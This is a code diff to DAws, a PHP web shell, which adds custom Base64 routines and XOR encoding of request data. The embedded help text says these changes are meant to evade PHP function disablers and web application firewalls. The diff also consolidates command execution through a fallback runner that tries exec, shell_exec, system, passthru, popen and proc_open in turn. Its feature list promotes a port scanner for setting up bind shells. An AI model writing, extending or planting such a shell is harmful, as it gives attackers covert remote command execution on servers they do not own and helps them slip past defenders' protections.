@@ -75,6 +75,129 @@ if (!isset($_SESSION['key']))
 	$_SESSION['key'] = generateRandomString();
 }
 
+$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");
+
+function binToDec($string)
+{
+	$decimal = "";
+	for($i = 0; $i<strlen($string); $i++)
+	{
+		$dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
+		$decimal+=$dec;
+	}
+	
+	return intval($decimal);
+}
+
+function decToBin($dec)
+{
+	$binary = "";
+	$current = intval($dec);
+
+	if ($current == 0)
+	{
+		return "0";
+	}
+	
+	while (1)
+	{
+		if ($current == 1)
+		{
+			$binary="1".$binary;
+			break;
+		}
+		$binary = ($current%2).$binary;
+		$current = intval($current/2);
+	}
+	
+	return $binary;
+}
+
+function base64encoding($string)
+{
+	global $base64ids;
+
+	$binary = "";
+	for ($i = 0; $i<strlen($string); $i++)
+	{
+		$charASCII = ord($string{$i});
+		$asciiBIN = decToBin($charASCII);
+		if (strlen($asciiBIN) != 8)
+		{
+			$asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;	
+		}
+		$binary.= $asciiBIN;
+	}
+
+	$array = array();
+	for ($j = 0; $j<strlen($binary); $j = $j + 6)
+	{
+		$part = substr($binary, $j, 6);
+		array_push($array, $part);
+	}
+
+	if (strlen($array[count($array)-1]) != 6)
+	{
+		$array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
+	}
+
+	$base64 = "";
+	foreach ($array as &$value)
+	{
+		$value = binToDec($value);
+		$value = $base64ids[$value];
+		$base64.=$value;
+	}
+
+	if ((strlen($base64) % 4) != 0)
+	{
+		$base64.=str_repeat("=", 4-(strlen($base64) % 4));
+	}
+
+	return $base64;
+}
+
+function base64decoding($string)
+{
+	global $base64ids;
+
+	$string = str_replace("=", "", $string);
+
+	$binary = "";	
+	for ($i = 0; $i < strlen($string); $i++)
+	{
+		$charID = array_search($string{$i}, $base64ids);
+		$idBIN = decToBin($charID);
+		if (strlen($idBIN) != 6)
+		{
+			$idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;	
+		}
+		$binary.= $idBIN;
+	}
+	
+	if (strlen($binary) %8 != 0)
+	{
+		$binary = substr($binary, 0, strlen($binary)-(strlen($binary) %8));
+	}
+
+	$array = array();
+	for ($j = 0; $j<strlen($binary); $j = $j + 8)
+	{
+		$part = substr($binary, $j, 8);
+		array_push($array, $part);
+	}
+
+	$text = "";
+	foreach ($array as &$value)
+	{
+		$value = binToDec($value);
+		$value = chr($value);
+		$text.=$value;
+	}
+
+	return $text;
+}
+
 function xor_this($string)
 {
 	$key = $_SESSION['key'];
@@ -87,12 +210,12 @@ function xor_this($string)
 			$outText .= $string{$i} ^ $key{$j};
 		}
 	}
-	return base64_encode($outText);
+	return base64encoding($outText);
 }
 
 function unxor_this($string)
 {
-	return base64_decode(xor_this(base64_decode($string)));
+	return base64decoding(xor_this(base64decoding($string)));
 }
 
 function sh3ll_this($string)
@@ -107,12 +230,12 @@ function sh3ll_this($string)
 			$outText .= $string{$i} ^ $key{$j};
 		}
 	}
-	return base64_encode($outText);
+	return base64encoding($outText);
 }
 
 function unsh3ll_this($string)
 {
-	return base64_decode(sh3ll_this(base64_decode($string)));
+	return base64decoding(sh3ll_this(base64decoding($string)));
 }
 
 ?>
@@ -362,7 +485,7 @@ function showDiv()
 		<li>There's multiple things that makes DAws better than every Web Shell out there:</li>
 		<ol>
 			<li>Bypasses Disablers; DAws isn't just about using a particular function to get the job done, it uses up to 6 functions if needed, for example, if `shell_exec` was disabled it would automatically use `exec` or `passthru` or `system` or `popen` or `proc_open` instead, same for Downloading a File from a Link, if `Curl` was disabled then `file_get_content` is used instead and this Feature is widely used in every section and fucntion of the shell.</li>
-			<li>Automatic Random Encoding; DAws randomly encodes automatically most of your GET and POST data using Java Script or PHP which will allow your shell to Bypass pretty much every WAF out there.</li>
+			<li>Automatic Encoding; DAws randomly and automatically encodes most of your GET and POST data using XOR(Randomized key for every session) + Base64(We created our own Base64 encoding functions instead of using the PHP ones to bypass Disablers) which will allow your shell to Bypass pretty much every WAF out there.</li>
 			<li>Advanced File Manager; DAws's File Manager contains everything a File Manager needs and even more but the main Feature is that everything is dynamically printed; the permissions of every File and Folder are checked, now, the functions that can be used will be available based on these permissions, this will save time and make life much easier.</li>
 			<li>Tools: DAws holds bunch of useful tools such as "bpscan" which can identify useable and unblocked ports on the server within few minutes which can later on allow you to go for a bind shell for example.</li>
 			<li>Everything that can't be used at all will be simply removed so Users do not have to waste their time. We're for example mentioning the execution of c++ scripts when there's no c++ compilers on the server(DAws would have checked for multiple compilers in the first place) in this case, the function would be automatically removed and the User would know.</li>
@@ -524,7 +647,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		echo "
 		<tr>
 			<td>Version</td>
-			<td></td>
+			<td>N/A</td>
 		</tr>";
 	}
 
@@ -547,7 +670,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		echo "
 		<tr>
 			<td>Current User</td>
-			<td></td>
+			<td>N/A</td>
 		</tr>";
 	}
 
@@ -1070,6 +1193,11 @@ function evalRel($command)
 			echo $stdout;
 		}
 	}
+	else
+	{
+		echo "Fail";
+		return False;
+	}
 }
 
 
@@ -1398,52 +1526,7 @@ else if(isset($_GET["zip"]))
 			}
 			else
 			{
-				if ($exec == True)
-				{
-					exec("zip -r $archiveName $archiveName");
-				}				
-				else if($shell_exec == True)
-				{
-					shell_exec("zip -r $archiveName $archiveName");
-				}				
-				else if($system == True)
-				{
-					system("zip -r $archiveName $archiveName");
-				}
-				else if($passthru == True)
-				{
-					 passthru("zip -r $archiveName $archiveName");
-				}
-				else if($popen == true)
-				{
-					$pid = popen("zip -r $archiveName $archiveName","r");
-					pclose($pid);
-				}
-				else if($proc_open == true)
-				{
-					$process = proc_open(
-						"zip -r $archiveName $archiveName",
-						array(
-							0 => array("pipe", "r"),
-							1 => array("pipe", "w"),
-							2 => array("pipe", "w"),
-						),
-						$pipes
-					);
-
-					if ($process !== false)
-					{
-						fclose($pipes[1]);
-						fclose($pipes[2]);
-						proc_close($process);
-					}
-					else
-					{
-						echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
-						$zipFail = True;
-					}
-				}
-				else
+				if(evalRel("zip -r $archiveName $archiveName")==False)
 				{
 					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
 					$zipFail = True;
@@ -2897,73 +2980,7 @@ End Sub';
 
 
 file_put_contents("zipFolder.vbs", $code);
-
-if ($shell_exec == True)
-{
-	echo shell_exec("cscript //nologo zipFolder.vbs");
-}
-else if($exec == True)
-{
-	echo exec("cscript //nologo zipFolder.vbs");
-}
-else if($passthru == True)
-{
-	passthru("cscript //nologo zipFolder.vbs");
-}
-else if($system == True)
-{
-	system("cscript //nologo zipFolder.vbs");
-}
-else if($popen == true)
-{
-	$pid = popen("cscript //nologo zipFolder.vbs","r");
-	while(!feof($pid))
-	{
-		echo fread($pid, 256);
-		flush();
- 		ob_flush();
-		usleep(100000);
-	}
-	pclose($pid);
-}
-else if($proc_open == true)
-{
-	$process = proc_open(
-		"cscript //nologo zipFolder.vbs",	
-		array(
-			0 => array("pipe", "r"),
-			1 => array("pipe", "w"),
-			2 => array("pipe", "w"),
-		),
-		$pipes
-	);
-	
-	if ($process !== false)
-	{
-		$stdout = stream_get_contents($pipes[1]);
-		$stderr = stream_get_contents($pipes[2]);
-		fclose($pipes[1]);
-		fclose($pipes[2]);
-		proc_close($process);
-		
-		if ($stderr != "")
-		{
-			echo $stderr;
-		}
-		else
-		{
-			echo $stdout;
-		}
-	}
-	else
-	{
-		echo "Fail";
-	}
-}
-else
-{
-	echo "Fail";
-}
+evalRel("cscript //nologo zipFolder.vbs");
 }
 ?>
 
